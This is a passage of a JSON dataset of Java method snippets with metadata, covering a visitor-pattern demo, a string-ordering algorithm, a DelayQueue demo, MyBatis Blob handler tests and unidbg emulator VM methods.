"https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/visitor/JadeArticle.java", "stars": "2", "class_props": {"extends": null, "implements": ["Museum"], "modifiers": ["public"]}}, {"id": 59964, "method_name": "accept", "class_name": "JadeArticle", "params": ["Visitor"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void accept(Visitor visitor) {\n        visitor.visit(this);\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/visitor/JadeArticle.java", "stars": "2", "class_props": {"extends": null, "implements": ["Museum"], "modifiers": ["public"]}}, {"id": 59965, "method_name": "lowestString1", "class_name": "Code01_LowestLexicography", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "\tpublic static String lowestString1(String[] strs) {\n\t\tif (strs == null || strs.length == 0) {\n\t\t\treturn \"\";\n\t\t}\n\t\tArrayList<String> all = new ArrayList<>();\n\t\tHashSet<Integer> use = new HashSet<>();\n\t\tprocess(strs, use, \"\", all);\n\t\tString lowest = all.get(0);\n\t\tfor (int i = 1; i < all.size(); i++) {\n\t\t\tif (all.get(i).compareTo(lowest) < 0) {\n\t\t\t\tlowest = all.get(i);\n\t\t\t}\n\t\t}\n\t\treturn lowest;\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class09/Code01_LowestLexicography.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59966, "method_name": "process", "class_name": "Code01_LowestLexicography", "params": ["String", "HashSet<Integer>", "String", "ArrayList<String>"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void process(String[] strs, \n\t\t\tHashSet<Integer> use, \n\t\t\tString path, \n\t\t\tArrayList<String> all) {\n\t\tif (use.size() == strs.length) {\n\t\t\tall.add(path);\n\t\t} else {\n\t\t\tfor (int i = 0; i < strs.length; i++) {\n\t\t\t\tif (!use.contains(i)) {\n\t\t\t\t\tuse.add(i);\n\t\t\t\t\tprocess(strs, use, path + strs[i], all);\n\t\t\t\t\tuse.remove(i);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class09/Code01_LowestLexicography.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59967, "method_name": "lowestString2", "class_name": "Code01_LowestLexicography", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "\tpublic static String lowestString2(String[] strs) {\n\t\tif (strs == null || strs.length == 0) {\n\t\t\treturn \"\";\n\t\t}\n\t\tArrays.sort(strs, new MyComparator());\n\t\tString res = \"\";\n\t\tfor (int i = 0; i < strs.length; i++) {\n\t\t\tres += strs[i];\n\t\t}\n\t\treturn res;\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class09/Code01_LowestLexicography.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59968, "method_name": "generateRandomString", "class_name": "Code01_LowestLexicography", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "\tpublic static String generateRandomString(int strLen) {\n\t\tchar[] ans = new char[(int) (Math.random() * strLen) + 1];\n\t\tfor (int i = 0; i < ans.length; i++) {\n\t\t\tint value = (int) (Math.random() * 5);\n\t\t\tans[i] = (char) (97 + value);\n\t\t}\n\t\treturn String.valueOf(ans);\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class09/Code01_LowestLexicography.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59969, "method_name": "generateRandomStringArray", "class_name": "Code01_LowestLexicography", "params": ["int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "\tpublic static String[] generateRandomStringArray(int arrLen, int strLen) {\n\t\tString[] ans = new String[(int) (Math.random() * arrLen) + 1];\n\t\tfor (int i = 0; i < ans.length; i++) {\n\t\t\tans[i] = generateRandomString(strLen);\n\t\t}\n\t\treturn ans;\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class09/Code01_LowestLexicography.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59970, "method_name": "copyStringArray", "class_name": "Code01_LowestLexicography", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "\tpublic static String[] copyStringArray(String[] arr) {\n\t\tString[] ans = new String[arr.length];\n\t\tfor (int i = 0; i < ans.length; i++) {\n\t\t\tans[i] = String.valueOf(arr[i]);\n\t\t}\n\t\treturn ans;\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class09/Code01_LowestLexicography.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59971, "method_name": "main", "class_name": "Code01_LowestLexicography", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\n\t\tint arrLen = 6;\n\t\tint strLen = 5;\n\t\tint testTimes = 100000;\n\t\tfor (int i = 0; i < testTimes; i++) {\n\t\t\tString[] arr1 = generateRandomStringArray(arrLen, strLen);\n\t\t\tString[] arr2 = copyStringArray(arr1);\n\t\t\tif (!lowestString1(arr1).equals(lowestString2(arr2))) {\n\t\t\t\tSystem.out.println(\"Oops!\");\n\t\t\t}\n\t\t}\n\t\tSystem.out.println(\"finish!\");\n\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class09/Code01_LowestLexicography.java", "stars": "27", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59972, "method_name": "compare", "class_name": "MyComparator", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\t\tpublic int compare(String a, String b) {\n\t\t\treturn (a + b).compareTo(b + a);\n\t\t}", "url": "https://raw.githubusercontent.com/algorithmzuo/algorithmbasic2020/master/src/class09/Code01_LowestLexicography.java", "stars": "27", "class_props": {"extends": null, "implements": ["Comparator"], "modifiers": ["public", "static"]}}, {"id": 59973, "method_name": "main", "class_name": "DelayQueueDemo", "params": ["String"], "throws": ["InterruptedException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) throws InterruptedException {\n\n        Order Order1 = new Order(\"Order1\", 5, TimeUnit.SECONDS);\n        Order Order2 = new Order(\"Order2\", 10, TimeUnit.SECONDS);\n        Order Order3 = new Order(\"Order3\", 15, TimeUnit.SECONDS);\n\n        DelayQueue<Order> delayQueue = new DelayQueue<>();\n\n        delayQueue.put(Order1);\n        delayQueue.put(Order2);\n        delayQueue.put(Order3);\n\n        System.out.println(\"\u8ba2\u5355\u5ef6\u8fdf\u961f\u5217\u5f00\u59cb\u65f6\u95f4:\" + LocalDateTime.now().format(DateTimeFormatter.ofPattern(\"yyyy-MM-dd HH:mm:ss\")));\n\n        while (delayQueue.size() != 0) {\n\n            /**\n             * \u53d6\u961f\u5217\u5934\u90e8\u5143\u7d20\u662f\u5426\u8fc7\u53bb\n             */\n            Order task = delayQueue.poll();\n            Order task1 = delayQueue.take();\n\n\n            if (task1 != null) {\n                System.out.format(\"\u8ba2\u5355:{%s}\u88ab\u53d6\u6d88, \u53d6\u6d88\u65f6\u95f4:{%s}\\n\", task1.name, LocalDateTime.now().format(DateTimeFormatter.ofPattern(\"yyyy-MM-dd HH:mm:ss\")));\n            }else{\n                System.out.println(\"null\");\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/chengxy-nds/delayqueue/master/src/main/java/com/chengxy/delayqueue/delayQueue/DelayQueueDemo.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59974, "method_name": "setupSqlSessionFactory", "class_name": "BlobInputStreamTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["static"], "return_type": "void", "snippet": "  static void setupSqlSessionFactory() throws Exception {\n    DataSource dataSource = BaseDataTest.createUnpooledDataSource(\"org/apache/ibatis/type/jdbc.properties\");\n    TransactionFactory transactionFactory = new JdbcTransactionFactory();\n    Environment environment = new Environment(\"Production\", transactionFactory, dataSource);\n    Configuration configuration = new Configuration(environment);\n    configuration.addMapper(Mapper.class);\n    sqlSessionFactory = new SqlSessionFactoryBuilder().build(configuration);\n\n    BaseDataTest.runScript(sqlSessionFactory.getConfiguration().getEnvironment().getDataSource(),\n            \"org/apache/ibatis/type/BlobInputStreamTypeHandlerTest.sql\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/BlobInputStreamTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 59975, "method_name": "shouldSetParameter", "class_name": "BlobInputStreamTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldSetParameter() throws Exception {\n    InputStream in = new ByteArrayInputStream(\"Hello\".getBytes());\n    TYPE_HANDLER.setParameter(ps, 1, in, null);\n    verify(ps).setBlob(1, in);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/BlobInputStreamTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 59976, "method_name": "shouldGetResultFromResultSetByName", "class_name": "BlobInputStreamTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultFromResultSetByName() throws Exception {\n    InputStream in = new ByteArrayInputStream(\"Hello\".getBytes());\n    when(rs.getBlob(\"column\")).thenReturn(blob);\n    when(blob.getBinaryStream()).thenReturn(in);\n    assertThat(TYPE_HANDLER.getResult(rs, \"column\")).isEqualTo(in);\n\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/BlobInputStreamTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 59977, "method_name": "shouldGetResultNullFromResultSetByName", "class_name": "BlobInputStreamTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultNullFromResultSetByName() throws Exception {\n    when(rs.getBlob(\"column\")).thenReturn(null);\n    assertThat(TYPE_HANDLER.getResult(rs, \"column\")).isNull();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/BlobInputStreamTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 59978, "method_name": "shouldGetResultFromResultSetByPosition", "class_name": "BlobInputStreamTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultFromResultSetByPosition() throws Exception {\n    InputStream in = new ByteArrayInputStream(\"Hello\".getBytes());\n    when(rs.getBlob(1)).thenReturn(blob);\n    when(blob.getBinaryStream()).thenReturn(in);\n    assertThat(TYPE_HANDLER.getResult(rs, 1)).isEqualTo(in);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/BlobInputStreamTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 59979, "method_name": "shouldGetResultNullFromResultSetByPosition", "class_name": "BlobInputStreamTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultNullFromResultSetByPosition() throws Exception {\n    when(rs.getBlob(1)).thenReturn(null);\n    assertThat(TYPE_HANDLER.getResult(rs, 1)).isNull();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/BlobInputStreamTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 59980, "method_name": "shouldGetResultFromCallableStatement", "class_name": "BlobInputStreamTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultFromCallableStatement() throws Exception {\n    InputStream in = new ByteArrayInputStream(\"Hello\".getBytes());\n    when(cs.getBlob(1)).thenReturn(blob);\n    when(blob.getBinaryStream()).thenReturn(in);\n    assertThat(TYPE_HANDLER.getResult(cs, 1)).isEqualTo(in);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/BlobInputStreamTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 59981, "method_name": "shouldGetResultNullFromCallableStatement", "class_name": "BlobInputStreamTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultNullFromCallableStatement() throws Exception {\n    when(cs.getBlob(1)).thenReturn(null);\n    assertThat(TYPE_HANDLER.getResult(cs, 1)).isNull();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/BlobInputStreamTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 59982, "method_name": "integrationTest", "class_name": "BlobInputStreamTypeHandlerTest", "params": [], "throws": ["IOException"], "modifiers": [], "return_type": "void", "snippet": "  void integrationTest() throws IOException {\n    try (SqlSession session = sqlSessionFactory.openSession()) {\n      Mapper mapper = session.getMapper(Mapper.class);\n      // insert (InputStream -> Blob)\n      {\n        BlobContent blobContent = new BlobContent();\n        blobContent.setId(1);\n        blobContent.setContent(new ByteArrayInputStream(\"Hello\".getBytes()));\n        mapper.insert(blobContent);\n        session.commit();\n      }\n      // select (Blob -> InputStream)\n      {\n        BlobContent blobContent = mapper.findOne(1);\n        assertThat(new BufferedReader(new InputStreamReader(blobContent.getContent())).readLine()).isEqualTo(\"Hello\");\n      }\n    }\n\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/BlobInputStreamTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 59983, "method_name": "getId", "class_name": "BlobContent", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getId() {\n      return id;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/BlobInputStreamTypeHandlerTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["static"]}}, {"id": 59984, "method_name": "setId", "class_name": "BlobContent", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setId(int id) {\n      this.id = id;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/BlobInputStreamTypeHandlerTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["static"]}}, {"id": 59985, "method_name": "getContent", "class_name": "BlobContent", "params": [], "throws": null, "modifiers": ["public"], "return_type": "InputStream", "snippet": "    public InputStream getContent() {\n      return content;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/BlobInputStreamTypeHandlerTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["static"]}}, {"id": 59986, "method_name": "setContent", "class_name": "BlobContent", "params": ["InputStream"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setContent(InputStream content) {\n      this.content = content;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/BlobInputStreamTypeHandlerTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["static"]}}, {"id": 59987, "method_name": "setVerbose", "class_name": "BaseVM", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setVerbose(boolean verbose) {\n        this.verbose = verbose;\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/android/dvm/BaseVM.java", "stars": "16", "class_props": {"extends": null, "implements": ["VM"], "modifiers": ["public", "abstract"]}}, {"id": 59988, "method_name": "throwException", "class_name": "BaseVM", "params": ["DvmObject<?>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void throwException(DvmObject<?> throwable) {\n        this.throwable = throwable;\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/android/dvm/BaseVM.java", "stars": "16", "class_props": {"extends": null, "implements": ["VM"], "modifiers": ["public", "abstract"]}}, {"id": 59989, "method_name": "setJni", "class_name": "BaseVM", "params": ["Jni"], "throws": null, "modifiers": ["final", "public"], "return_type": "void", "snippet": "    public final void setJni(Jni jni) {\n        this.jni = jni;\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/android/dvm/BaseVM.java", "stars": "16", "class_props": {"extends": null, "implements": ["VM"], "modifiers": ["public", "abstract"]}}, {"id": 59990, "method_name": "addNotFoundClass", "class_name": "BaseVM", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addNotFoundClass(String className) {\n        notFoundClassSet.add(className);\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/android/dvm/BaseVM.java", "stars": "16", "class_props": {"extends": null, "implements": ["VM"], "modifiers": ["public", "abstract"]}}, {"id": 59991, "method_name": "resolveClass", "class_name": "BaseVM", "params": ["String", "DvmClass"], "throws": null, "modifiers": ["final", "public"], "return_type": "DvmClass", "snippet": "    public final DvmClass resolveClass(String className, DvmClass... interfaceClasses) {\n        long hash = Objects.hash(className) & 0xffffffffL;\n        DvmClass dvmClass = classMap.get(hash);\n        if (dvmClass == null) {\n            dvmClass = new DvmClass(this, className, interfaceClasses);\n            classMap.put(hash, dvmClass);\n            addObject(dvmClass, true);\n        }\n        return dvmClass;\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/android/dvm/BaseVM.java", "stars": "16", "class_props": {"extends": null, "implements": ["VM"], "modifiers": ["public", "abstract"]}}, {"id": 59992, "method_name": "addObject", "class_name": "BaseVM", "params": ["DvmObject<?>", "boolean"], "throws": null, "modifiers": ["final"], "return_type": "int", "snippet": "    final int addObject(DvmObject<?> object, boolean global) {\n        if (object == null) {\n            return 0;\n        } else {\n            long hash = object.hashCode() & 0xffffffffL;\n            if (log.isDebugEnabled()) {\n                log.debug(\"addObject hash=0x\" + Long.toHexString(hash));\n            }\n            if (global) {\n                globalObjectMap.put(hash, object);\n            } else {\n                localObjectMap.put(hash, object);\n            }\n            return (int) hash;\n        }\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/android/dvm/BaseVM.java", "stars": "16", "class_props": {"extends": null, "implements": ["VM"], "modifiers": ["public", "abstract"]}}, {"id": 59993, "method_name": "addLocalObject", "class_name": "BaseVM", "params": ["DvmObject<?>"], "throws": null, "modifiers": ["final", "public"], "return_type": "int", "snippet": "    public final int addLocalObject(DvmObject<?> object) {\n        if (object == null) {\n            return JNI_NULL;\n        }\n\n        return addObject(object, false);\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/android/dvm/BaseVM.java", "stars": "16", "class_props": {"extends": null, "implements": ["VM"], "modifiers": ["public", "abstract"]}}, {"id": 59994, "method_name": "getObject", "class_name": "BaseVM", "params": ["long"], "throws": null, "modifiers": ["final", "public"], "return_type": "T", "snippet": "    public final <T extends DvmObject<?>> T getObject(long hash) {\n        if (localObjectMap.containsKey(hash)) {\n            return (T) localObjectMap.get(hash);\n        } else {\n            return (T) globalObjectMap.get(hash);\n        }\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/android/dvm/BaseVM.java", "stars": "16", "class_props": {"extends": null, "implements": ["VM"], "modifiers": ["public", "abstract"]}}, {"id": 59995, "method_name": "findClass", "class_name": "BaseVM", "params": ["String"], "throws": null, "modifiers": ["final", "public"], "return_type": "DvmClass", "snippet": "    public final DvmClass findClass(String className) {\n        return classMap.get(Objects.hash(className) & 0xffffffffL);\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/android/dvm/BaseVM.java", "stars": "16", "class_props": {"extends": null, "implements": ["VM"], "modifiers": ["public", "abstract"]}}, {"id": 59996, "method_name": "deleteLocalRefs", "class_name": "BaseVM", "params": [], "throws": null, "modifiers": ["final", "public"], "return_type": "void", "snippet": "    public final void deleteLocalRefs() {\n        localObjectMap.clear();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/android/dvm/BaseVM.java", "stars": "16", "class_props": {"extends": null, "implements": ["VM"], "modifiers": ["public", "abstract"]}}, {"id": 59997, "method_name": "findLibrary", "class_name": "BaseVM", "params": ["ApkFile", "String"], "throws": ["IOException"], "modifiers": ["abstract"], "return_type": "byte", "snippet": "    abstract byte[] findLibrary(ApkFile apkFile, String soName) throws IOException;\n\n    @Override\n    public final DalvikModule loadLibrary(String libname, boolean forceCallInit) throws IOException {\n        if (apkFile == null) {\n            throw new UnsupportedOperationException();\n        }\n\n        String soName = \"lib\" + libname + \".so\";\n        ApkFile apkFile = null;\n        try {\n            apkFile = new ApkFile(this.apkFile);\n\n            byte[] libData = findLibrary(apkFile, soName);\n            if (libData == null) {\n                throw new IOException(\"load library failed: \" + libname);\n            }\n\n            Module module = emulator.getMemory().load(new ApkLibraryFile(apkFile, soName, libData), forceCallInit);\n            return new DalvikModule(this, module);\n        } finally {\n            IOUtils.closeQuietly(apkFile);\n        }\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/android/dvm/BaseVM.java", "stars": "16", "class_props": {"extends": null, "implements": ["VM"], "modifiers": ["public", "abstract"]}}, {"id": 59998, "method_name": "loadLibrary", "class_name": "BaseVM", "params": ["String", "boolean"], "throws": ["IOException"], "modifiers": ["final", "public"], "return_type": "DalvikModule", "snippet": "    public final DalvikModule loadLibrary(String libname, boolean forceCallInit) throws IOException {\n        if (apkFile == null) {\n            throw new UnsupportedOperationException();\n        }\n\n        String soName = \"lib\" + libname + \".so\";\n        ApkFile apkFile = null;\n        try {\n            apkFile = new ApkFile(this.apkFile);\n\n            byte[] libData = findLibrary(apkFile, soName);\n            if (libData == null) {\n                throw new IOException(\"load library failed: \" + libname);\n            }\n\n            Module module = emulator.getMemory().load(new ApkLibraryFile(apkFile, soName, libData), forceCallInit);\n            return new DalvikModule(this, module);\n        } finally {\n            IOUtils.closeQuietly(apkFile);\n        }\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/android/dvm/BaseVM.java", "stars": "16", "class_props": {"extends": null, "implements": ["VM"], "modifiers": ["public", "abstract"]}}]